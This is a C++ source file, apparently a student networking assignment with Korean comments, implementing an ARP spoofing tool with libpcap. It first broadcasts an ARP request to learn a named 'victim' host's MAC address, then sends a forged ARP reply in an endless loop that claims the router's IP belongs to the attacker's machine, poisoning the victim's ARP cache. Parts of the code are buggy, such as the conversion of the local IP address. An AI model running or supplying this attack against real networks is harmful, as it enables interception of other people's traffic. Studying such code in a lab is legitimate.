#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h> //ifr 사용
#include <netinet/in.h>
#include <sys/ioctl.h>

#pragma pack(push, 1)


struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp-test enp0s8 192.168.43.2 192.168.43.1\n");
}


int get_mMAC(const char *ifname, u_char* myMAC);
int get_mIP(const char *dev, u_char* myIP);


int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
    u_char myMAC[6]; //호스트 맥
    get_mMAC(dev, myMAC);
    u_char myIP[4];
    get_mIP(dev, myIP);

    u_char sMAC[6];
    u_char sender_ip[4]; //argv[2] victim, 핫스팟 킨 노트북
    u_char target_ip[4]; //argv[3] 라우터 ip... 대체할게없다...
	char errbuf[PCAP_ERRBUF_SIZE];
    inet_aton(argv[2], (in_addr*)sender_ip); // victim
    inet_aton(argv[3], (in_addr*)target_ip); // router

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
        fprintf(stderr, "연결이 잘못되었습니다. %s(%s)\n", dev, errbuf);
		return -1;
	}

     //패킷생성 -by 길길
     EthArpPacket packet;


   //1단계 : victim에게 request 보내기 -> reply 받으면 거기서 mac 꺼낼 수 있음!
     packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); //브로드캐스팅
     packet.eth_.smac_ = Mac(myMAC);
     packet.eth_.type_ = htons(EthHdr::Arp);

     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
     packet.arp_.pro_ = htons(EthHdr::Ip4);
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(ArpHdr::Request);
     packet.arp_.smac_ = Mac(myMAC);
     packet.arp_.sip_ = htons(Ip(*myIP)); //내 ip
     packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
     packet.arp_.tip_ = htonl(*sender_ip); //victim htonl(Ip(*sender_ip))

     while(1){
             struct pcap_pkthdr * rep_header;
             const u_char * rep_packet;

             printf("ARP request packet 보내는 중...\n");
             pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
             int res = pcap_next_ex(handle, &rep_header, &rep_packet);
             if(res ==0) continue;
             if(res == -1 || res == -2) break;

             EthHdr * get_mac = ( EthHdr *)rep_packet;

             if( get_mac->type_ != htons(EthHdr::Arp)){
                 continue;
             }
             //printf("맥 까지는받음\n");

             ArpHdr * get_arp = ( ArpHdr *)(rep_packet+14);
             if(get_arp->op_ != htons(ArpHdr::Reply)){ //reply만 진행
                 continue;
             }
             //printf("arp 까지는받음\n");

             memcpy(sMAC, get_arp->smac_, 6);
             //printf("victim's MAC 받아내기 성공!\n");
             /*printf("smac : %02x:%02x:%02x:%02x:%02x:%02x\n", sMAC[0],sMAC[1],sMAC[2],sMAC[3],
                     sMAC[4],sMAC[5]);*/
             break;

         }
   //2단계 : 1단계에서 얻은 victim's의 mac을 바탕으로 arp reply...! 
    packet.eth_.dmac_ = Mac(sMAC); //목적지 mac 얻는 법??? -> 이번 과제 핵심
    packet.eth_.smac_ = Mac(myMAC);
    packet.eth_.type_ = htons(EthHdr::Arp);
    
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(myMAC);
    packet.arp_.sip_ = htonl(*target_ip); //htonl(Ip(*target_ip));
    packet.arp_.tmac_ = Mac(sMAC); //필요함 Mac(sMAC)
    packet.arp_.tip_ = htonl(*sender_ip); //victim htonl(Ip(*sender_ip))


     while(1){
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        printf("Packet reply Attack...!\n");

	if (res != 0) {
        fprintf(stderr, "pcap_send error : %d, %s\n", res, pcap_geterr(handle));
	}
     }

	pcap_close(handle);
}

int get_mMAC(const char *dev, u_char* myMAC){
         struct ifreq s;
        int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
        strcpy(s.ifr_name, dev);//주소변경

        if(!ioctl(fd, SIOCGIFHWADDR, &s)){
            for(int i =0; i<6; i++){
                myMAC[i] = s.ifr_addr.sa_data[i];
            }
        }
        return 1;
}

int get_mIP(const char *dev, u_char* myIP)
{
    struct ifreq s;
    int fd =socket(AF_INET,SOCK_STREAM,0);
    char ipstr[40];//4하니깐 스택에러

    strncpy(s.ifr_name, dev, IFNAMSIZ);

    if (ioctl(fd,SIOCGIFADDR,&s)< 0 )
    {
        perror("ip ioctl error");
        return -1;
    }

    inet_ntop(AF_INET, s.ifr_addr.sa_data+2, ipstr, sizeof(struct sockaddr));
    memcpy (myIP, ipstr, sizeof(struct sockaddr));
    return 0;
}


